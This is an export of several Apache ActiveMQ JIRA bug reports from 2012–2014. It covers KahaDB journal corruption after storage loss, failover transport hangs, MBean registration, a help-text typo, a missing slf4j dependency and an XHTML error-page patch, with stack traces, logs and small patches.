Caused by: java.io.IOException: Invalid location: 125:11971180, : java.lang.NegativeArraySizeException
	at org.apache.kahadb.journal.DataFileAccessor.readRecord(DataFileAccessor.java:92)
	at org.apache.kahadb.journal.Journal.read(Journal.java:604)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:879)
	at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:1030)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:558)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:547)
	at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:106)
	at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:274)
	... 10 more
{noformat}

We haven't seen any more errors since the one above about 6 hours ago. I just pushed 1000 messages through and there were no errors, things seem normal.

We are not currently sure what may have happened to our SAN or connectivity during this time. We are still analyzing. Will attempt to recreate to understand the best way to mitigate this.;;;","14/Feb/13 18:11;absynthe49;I was looking at the source for JDBCIOExceptionHandler and it calls setStopStartConnectors(true) from the base class DefaultIOExceptionHandler.

It seems like the DefaultIOExceptionHandler already has code that would attempt to restart all the connectors. Don't know if this would resolve the issue but seems like we might want to either set stopStartConnectors to true by default or allow it to get set in activemq.xml.

Haven't pulled the repo yet... hopefully the history of this file doesn't indicate that setting this to true is buggy..;;;","14/Feb/13 20:32;absynthe49;We made a build of 5.7.0 with the stopStartConnectors flag set to true in DefaultIOExceptionHandler. Locally, I used a thumb drive as the datadirectory and would get producers and consumers working and then yank it. We reproduced a stack trace a bit more similar to above but still a bit different.

{noformat}
2013-02-14 11:16:16,032 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1:54836@61616
java.io.SyncFailedException: sync failed
                at java.io.FileDescriptor.sync(Native Method)
                at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:367)
                at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)
2013-02-14 11:16:16,035 | INFO  | Initiating stop/restart of broker transport due to IO exception, java.io.SyncFailedException: sync failed | org.apache.activemq.util.DefaultIOExceptionHandler | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1:54836@61616
java.io.SyncFailedException: sync failed
                at java.io.FileDescriptor.sync(Native Method)
                at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:367)
                at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)
2013-02-14 11:16:16,041 | INFO  | waiting for broker persistence adapter checkpoint to succeed before restarting transports | org.apache.activemq.util.DefaultIOExceptionHandler | restart transport connectors post IO exception
2013-02-14 11:16:16,062 | WARN  | Transport Connection to: tcp://0:0:0:0:0:0:0:1:54836 failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1:54836@61616
2013-02-14 11:16:16,268 | ERROR | KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1:54848@61616
java.io.IOException: The volume for a file has been externally altered so that the opened file is no longer valid
                at java.io.RandomAccessFile.readBytes(Native Method)
                at java.io.RandomAccessFile.read(RandomAccessFile.java:338)
                at java.io.RandomAccessFile.readFully(RandomAccessFile.java:397)
                at java.io.RandomAccessFile.readFully(RandomAccessFile.java:377)
                at org.apache.kahadb.page.PageFile.readPage(PageFile.java:876)

{noformat}

Then we got a loop trying to get a checkpoint before restarting transports:

{noformat}
2013-02-14 11:16:21,046 | INFO  | KahaDB: Recovering checkpoint thread after death | org.apache.activemq.store.kahadb.MessageDatabase | restart transport connectors post IO exception
2013-02-14 11:16:21,049 | INFO  | waiting for broker persistence adapter checkpoint to succeed before restarting transports | org.apache.activemq.util.DefaultIOExceptionHandler | restart transport connectors post IO exception
2013-02-14 11:16:26,055 | ERROR | Checkpoint failed | org.apache.activemq.store.kahadb.MessageDatabase | ActiveMQ Journal Checkpoint Worker
java.io.IOException: The volume for a file has been externally altered so that the opened file is no longer valid
                at java.io.RandomAccessFile.write(Native Method)
                at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)
                at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1077)
                at org.apache.kahadb.page.PageFile.flush(PageFile.java:515)
                at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1313)
                at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:769)
                at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)
                at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:767)
                at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:323)
2013-02-14 11:16:26,064 | INFO  | waiting for broker persistence adapter checkpoint to succeed before restarting transports | org.apache.activemq.util.DefaultIOExceptionHandler | restart transport connectors post IO exception
2013-02-14 11:16:31,069 | INFO  | KahaDB: Recovering checkpoint thread after death | org.apache.activemq.store.kahadb.MessageDatabase | restart transport connectors post IO exception

{noformat}

So it would not automatically come back... I then restarted AMQ and got the following:

{noformat}
2013-02-14 11:33:46,398 | INFO  | Using Persistence Adapter: KahaDBPersistenceAdapter[E:\kahadb] | org.apache.activemq.broker.BrokerService | main
2013-02-14 11:33:47,892 | INFO  | Corrupt journal records found in 'E:\kahadb\db-2.log' between offsets: 5576149..6343375 | org.apache.kahadb.journal.Journal | main
2013-02-14 11:33:47,905 | INFO  | Corrupt journal records found in 'E:\kahadb\db-2.log' between offsets: 6351482..6356885 | org.apache.kahadb.journal.Journal | main
2013-02-14 11:33:56,253 | INFO  | KahaDB is version 4 | org.apache.activemq.store.kahadb.MessageDatabase | main
2013-02-14 11:33:56,373 | INFO  | Recovering from the journal ... | org.apache.activemq.store.kahadb.MessageDatabase | main
2013-02-14 11:33:56,643 | INFO  | Recovery replayed 478 operations from the journal in 0.292 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main
2013-02-14 11:33:56,702 | INFO  | Scheduler using directory: E:\habroker\scheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | main
2013-02-14 11:33:56,726 | INFO  | Apache ActiveMQ 5.7.0 (habroker, ID:kpc-eng-d27-55891-1360870436389-0:1) is starting | org.apache.activemq.broker.BrokerService | main
2013-02-14 11:33:56,748 | INFO  | ignoring zero length, partially initialised journal data file: db-1.log number = 1 , length = 0 | org.apache.kahadb.journal.Journal | main
2013-02-14 11:33:57,343 | INFO  | JobSchedulerStore:E:\habroker\scheduler started | org.apache.activemq.broker.scheduler.JobSchedulerStore | main
{noformat}

This is a bit different than what we saw in our QA environment where it said it lost 33 messages.

I looked in the history of the file and in 5.5.1, the stopStartConnectors is still false. Not really sure what kicked off the retry in 5.5.1 vs. the broker stop in 5.7.0.;;;","14/Feb/13 20:35;absynthe49;Also... today which is about 18 hours later... we still do see some errors popping in our AMQ instance that seems related to this issue. Perhaps our data store is still corrupted/odd and we only see it for certain queues. Things in general do seem to still be working but I don't trust the state that it is in:

{noformat}
2013-02-14 11:02:39,710 | ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | ActiveMQ BrokerService[habroker] Task-789
java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Invalid location: 129:8716740, : java.lang.NegativeArraySizeException
                at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:150)
                at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)
                at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1766)
                at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1993)
                at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1486)
                at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
                at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
                at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
                at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
                at java.lang.Thread.run(Thread.java:679)
Caused by: java.lang.RuntimeException: java.io.IOException: Invalid location: 129:8716740, : java.lang.NegativeArraySizeException
                at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:277)
                at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:147)
                ... 9 more
Caused by: java.io.IOException: Invalid location: 129:8716740, : java.lang.NegativeArraySizeException
                at org.apache.kahadb.journal.DataFileAccessor.readRecord(DataFileAccessor.java:92)
                at org.apache.kahadb.journal.Journal.read(Journal.java:604)
                at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:879)
                at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:1030)
                at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:558)
                at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)
                at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:547)
                at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:106)
                at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
                at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:274)
                ... 10 more

{noformat};;;","02/Oct/13 15:58;davsclaus;Any update on this ticket? There has been many fixes et all since 5.5.1 release and we are closing in on 5.9.
So we need to know if this is resolved already or should be moved to 5.10.;;;","02/Oct/13 17:19;absynthe49;The most recent stack traces occurred in 5.7.0. I have been watching commits and have not seen anything that seemed like it would have addressed this.

I am pretty sure that losing the SAN or ability to write to disk is not handled correctly by the KahaDB-related code. I have seen LevelDB commits. Is there an opinion among the AMQ devs on whether KahaDB code will be deprecated in favor of another store?;;;","03/Oct/13 07:06;davsclaus;Yeah over time leveldb is intended as the preferred choice over kahadb. Though it takes time to be feature complete, and stabilize into the broker.;;;","10/Oct/13 21:09;gtully;@Rob Waite - do you have a scenario that is known to fail, a little test case. It is possible to configure the IOExceptionHandler.{code}<ioExceptionHandler>
   <defaultIOExceptionHandler stopStartConnectors=""true"" />
 </ioExceptionHandler>{code}. There may be an easy fix if there is a simple test case. The shutdown logic is better on trunk (5.9 snap)    and we auto recreate a corrupt index on restart so things could well be better. The original test case for the IOException handler revolved around disk-Full and disk-not-full recovery. Your scenario seems a little more random. But if we can narrow it down or break it down there may be some simple tweaks we can do to improve.;;;","11/Oct/13 17:54;absynthe49;So I reattempted with the latest snapshot (apache-activemq-5.9-20131011.032953-115-bin) and it did seem a lot better. My test is really just to make a producer that sends messages in a tight loop and to use a USB thumbdrive for the data directory. Then, while the producer is writing as fast as it can, I yank out the thumbdrive, wait a bit, and put it back in and wait for AMQ to handle it.

We have seen issues with our SAN becoming unavailable and seeing very similar stack traces.

With the new snapshot... it seems like it recovers most of the time. Twice (in maybe 15 minutes of testing) it would not start back up. The first time it seemed like the USB drive ""data"" folder got corrupted... I couldnt read from the data folder from windows (it would say it was corrupted). I reformatted it and tried again and the most recent error seemed like it would recover but then a very vague null pointer error happened.

Attached is the output (AMQ-3725-10112013.txt)... at the end you can see it tried to restart and then a nullpointerexception occurred and it halted (line 501).

I know a thumbdrive would not be used in prod... but the exceptions seemed very similar to what we have seen with our NFS store.

Overall, it is much more resilient than 5.7.0. Of the maybe 20 times I tried... 18 times it would restart automatically.;;;","31/Oct/13 17:11;dejanb;Hi,

I just pushed a change that should help with this scenario. I also tested ti with the USB drive and it seems that now KahaDB recovers properly. I also used a bit longer resume period (30 sec)

        <ioExceptionHandler>
            <defaultIOExceptionHandler stopStartConnectors=""true"" resumeCheckSleepPeriod=""30000"" />
        </ioExceptionHandler>

so I can have a bit more time to unplug and plug the drive back in before broker tries to recreate the folder. 

I started a new snapshot build, but I'm not sure if it's gonna be built soon. You can build it locally anyways. Test it out and let me know if the problem is still there.;;;","01/Nov/13 09:13;dejanb;Here's a snapshot containing a fix

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131101.033855-13-bin.tar.gz

to be tested;;;","01/Apr/14 15:46;davsclaus;Did anyone test the SNAPSHOT with a fix;;;","01/Apr/14 15:46;davsclaus;[~dejanb] should we assume this is fixed and close the ticket?;;;","07/Jun/14 21:18;artnaseef;Git commits:
https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=582af3e74adca7efbf7d88d092764325341b719d

https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=5dacae368b125cd6371bc5d74cb1820ba0a5ca5a;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dynamic Failover Blocks NetworkConnector & Queue MBean Creation,AMQ-3724,12542895,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,sully6768,sully6768,16/Feb/12 17:40,17/Feb/12 12:49,14/Jul/23 05:43,17/Feb/12 12:49,,,,,,5.6.0,,,,,,,0,,,,,,,,,"When enabling dynamic failover on the transport connectors some or all brokers in the cluster do not have their NetworkConnector or Queue mBeans enabled.  See attached patch.

Thanks,
Scott ES
http://fusesource.com",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Feb/12 12:47;sully6768;AMQ-3724.patch;https://issues.apache.org/jira/secure/attachment/12514978/AMQ-3724.patch","16/Feb/12 17:59;sully6768;ASF.LICENSE.NOT.GRANTED--visual-vm-mbean-screenshot.jpg;https://issues.apache.org/jira/secure/attachment/12514830/ASF.LICENSE.NOT.GRANTED--visual-vm-mbean-screenshot.jpg",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228181,,,Fri Feb 17 12:49:20 UTC 2012,,,,,,,,,,,"0|i0agpr:",58981,,,,,,,,,,,,,,,,,,,,,"16/Feb/12 17:41;sully6768;Unit test for complex clustering JMX tests.;;;","16/Feb/12 17:59;sully6768;Broker B & C do not have their network connectors mbeans available;;;","17/Feb/12 00:48;tabish;Because the brokers are all running inside the same JVM you need to call setCreateConnector(false) for brokers B and C so that they don't stop the management context and restart it.  Otherwise they clobber the names in the MBeanServer.

{noformat}
   getBroker(BROKER_B_NAME).getManagementContext().setCreateConnector(false);
{noformat}
;;;","17/Feb/12 12:46;sully6768;Thank Tim.  

That cleaned it up.  I will upload another patch with the changes.  If someone feels the unit tests are still valid feel free to apply them.

Thanks,
Scott ES
http://fusesource.com;;;","17/Feb/12 12:47;sully6768;Updated test with connector creation disabled.;;;","17/Feb/12 12:49;sully6768;Issue resolved.  New unit test attached.

Thanks,
Scott ES
http://fusesource.com;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""activemq-admin browse"" help command prints incorrect argument name for password in sample usage ",AMQ-3722,12542847,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,pgfox,pgfox,16/Feb/12 11:04,16/Feb/12 14:22,14/Jul/23 05:43,16/Feb/12 14:22,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Small cosmetic error

The help message printed from activemq-admin browse

{code}
Main browse --amqurl tcp://localhost:61616 --user someUser --pass somePass FOO.BAR
        - Print the message header, custom message header, and message body of all messages in the
          queue FOO.BAR, using someUser as the user name, and somePass as the password
{code}

the ""-pass"" argument above is not recognized, it should be ""-password""


",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Feb/12 11:07;pgfox;AmqBrowseCommand.java.patch;https://issues.apache.org/jira/secure/attachment/12514787/AmqBrowseCommand.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228133,,,Thu Feb 16 14:22:58 UTC 2012,,,,,,,,,,,"0|i0ai6f:",59218,,,,,,,,,,,,,,,,,,,,,"16/Feb/12 11:07;pgfox;patch based on trunk version 1234783
changed contents of ""help"" to be printed out ;;;","16/Feb/12 14:22;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tracked command IOException causes FailoverTransport to hang until failure occurs for untracked command,AMQ-3719,12542745,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,mserrano,mserrano,15/Feb/12 20:12,14/Mar/12 21:32,14/Jul/23 05:43,14/Mar/12 21:32,,,,,,5.6.0,,,Transport,,,,1,,,,,,,,,"I have only encountered this failure when the broker is experiencing heavy load and a new connection attempt is made.

* The FailoverTransport tracks commands that have been issued so that it can restore the state upon a failure/reconnect event.
* If an IOException occurs when sending a tracked command, the oneway() method returns, assuming that the IOException is indicative of a transport failure and will result in a failure/reconnect event.
* Some IOExceptions (like WireFormatNegotiation timesouts) are not always indicative of transport failure however.  In this case since no subsequent failure/reconnect event occurs, the command will never be resent.  If this is a synchronous command (like that generated by starting a connection) the calling thread will hang.

Incidentally, my reading of the code is that only non-tracked commands can generate the IOException that triggers the handleTransportFailure command.  Is that what we really want?  

My belief is that the IOExceptions should always result in the triggering of the handleTransportFailure, regardless of origin.

I will attach a unit test and fix shortly.  The test will often fail (i.e. hang) without the fix, but not always since I use a wireFormat.maxInactivityDurationInitalDelay=1 option to trigger the behavior.  If the system runs fast enough, it sometimes will not get the timeout.  I wasn't sure exactly how such a test should be written...The test will fail if connection does not succeed within 60s","Intel(R) Core(TM) i5 CPU M 540 @2.53GHz
8 GB, 64-bit",willjohnson3,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Feb/12 20:45;mserrano;amq-3719.patch;https://issues.apache.org/jira/secure/attachment/12514702/amq-3719.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228031,,,Wed Mar 14 21:32:07 UTC 2012,,,,,,,,,,,"0|i0ai6v:",59220,,,,,,,,,,,,,,,,,,,,,"15/Feb/12 20:45;mserrano;test and patch for bug attached;;;","10/Mar/12 17:20;tabish;This does appear to be an issue.  I don't think the patch is quite correct since it doesn't hop out of the redelivery attempt loop inside of oneway though which would cause the same tracked command to be attempted a second time which is shouldn't be since its already in the state tracker.  Perhaps the correct thing here is simply an else clause on the if (tracked == null) that calls the handleTransportFailure and then allows the method to return as usual.  ;;;","14/Mar/12 21:32;tabish;Fixed on trunk, thanks for doing the leg work on this one.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Published system requirements are inaccurate,AMQ-3717,12542593,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,petercgrant,petercgrant,14/Feb/12 20:45,22/Aug/12 19:18,14/Jul/23 05:43,22/Aug/12 19:18,5.5.0,5.5.1,,,,,,,Documentation,,,,0,documentation,,,,,,,,"Please correct documentation to reflect that this product requires Java 6 to build and to run.  As of 5.5.0, Java 5 is no longer supported (see http://activemq.apache.org/activemq-550-release.html). However the main page (http://activemq.apache.org/), the getting started page (http://activemq.apache.org/getting-started.html), the resource adapters page (http://activemq.apache.org/resource-adapter.html), and probably others all explicitly state that Java 1.4 and 1.5 are supported.",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,227879,,,Wed Aug 22 19:18:13 UTC 2012,,,,,,,,,,,"0|i0ec0v:",81710,,,,,,,,,,,,,,,,,,,,,"22/Aug/12 19:18;tabish;I updated some of the spots I could find to add the note about 5.5.0 moving to 1.6. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkBridge with conduitSubscriptions=true will leak consumer info in org.apache.activemq.network.DemandForwardingBridgeSupport#subscriptionMapByRemoteId map ,AMQ-3716,12542563,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,14/Feb/12 16:28,15/Feb/12 12:35,14/Jul/23 05:43,15/Feb/12 12:35,,,,,,5.6.0,,,Connector,,,,0,conduitSubscriptions,leak,networkbridge,,,,,,There is a leak in the tracking of consumer info commands in the conduit network bridge. Entries are not removed on a remove advisory.,,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,227849,,,Wed Feb 15 12:35:31 UTC 2012,,,,,,,,,,,"0|i0ai7b:",59222,,,,,,,,,,,,,,,,,,,,,"15/Feb/12 12:35;gtully;fix in http://svn.apache.org/viewvc?rev=1244116&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-all.jar is missing the slf4j-log4j12 dependency,AMQ-3715,12542419,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jsherman1,jsherman1,13/Feb/12 16:52,13/Feb/12 21:24,14/Jul/23 05:43,13/Feb/12 21:24,5.5.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"According to the documentation [1], the activemq-all.jar should contain all required libraries.  However when running a sample project the following error occurs:

java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.NoClassDefFoundError: org/slf4j/impl/StaticLoggerBinder
	at org.slf4j.LoggerFactory.getSingleton(LoggerFactory.java:230)
	at org.slf4j.LoggerFactory.bind(LoggerFactory.java:121)
	at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:112)
	at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:275)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:248)
	at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:261)
	at org.apache.activemq.ActiveMQPrefetchPolicy.<clinit>(ActiveMQPrefetchPolicy.java:38)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:88)
	at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:131)
	at com.fusesource.example.Producer.<init>(Producer.java:25)
	at com.fusesource.example.DEV3783.main(DEV3783.java:47)
	... 6 more
Caused by: java.lang.ClassNotFoundException: org.slf4j.impl.StaticLoggerBinder
	at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
	... 17 more

[1] http://activemq.apache.org/initial-configuration.html",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Feb/12 20:33;jsherman1;AMQ3715.patch;https://issues.apache.org/jira/secure/attachment/12514394/AMQ3715.patch","13/Feb/12 16:55;jsherman1;AMQ3715.patch;https://issues.apache.org/jira/secure/attachment/12514373/AMQ3715.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,227705,,,Mon Feb 13 21:24:34 UTC 2012,,,,,,,,,,,"0|i0ai7j:",59223,,,,,,,,,,,,,,,,,,,,,"13/Feb/12 16:55;jsherman1;Patch attached to resolve dependency issue in activemq-all.jar ;;;","13/Feb/12 18:51;tabish;Patch applied, with thanks!;;;","13/Feb/12 20:33;jsherman1;The previous patch was only a partial fix.  It still causes the following output when executing a test program...

SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
SLF4J: Failed to load class ""org.slf4j.impl.StaticMDCBinder"".
SLF4J: Defaulting to no-operation MDCAdapter implementation.
SLF4J: See http://www.slf4j.org/codes.html#no_static_mdc_binder for further details.

I have updated the patch and verified fix.

;;;","13/Feb/12 20:36;tabish;New patch submitted;;;","13/Feb/12 21:24;tabish;updated patch applied, tested and it seems to resolve the issues. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Patch to fix invalid XHTML in web-console's 404 and 500 pages,AMQ-3709,12541891,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,labthug,labthug,08/Feb/12 22:44,08/Feb/12 23:11,14/Jul/23 05:43,08/Feb/12 23:11,,,,,,5.6.0,,,Camel,,,,0,patch,webconsole,,,,,,,"We created a monitor that utilizes calls to the web-console to determine stuck messages.  Occasionally, requests come back 404 (because the message disappears between calls) and the monitor dies because the XHTML for that page is invalid.  This patch makes the 404 and 500 pages valid in the eyes of the w3c markup validation service.

Note: I'm placing the patch here because I do not see a place to upload it on this form.  If it appears later, I will attached.

Index: activemq-web-console/src/main/webapp/500.html
===================================================================
--- activemq-web-console/src/main/webapp/500.html	(revision 1242141)
+++ activemq-web-console/src/main/webapp/500.html	(working copy)
@@ -22,8 +22,7 @@
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> 
  
-<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd""> 
-<html> 
+<html xmlns='http://www.w3.org/1999/xhtml'> 
 <head> 
     <meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" /> 
     <title>Apache ActiveMQ</title> 
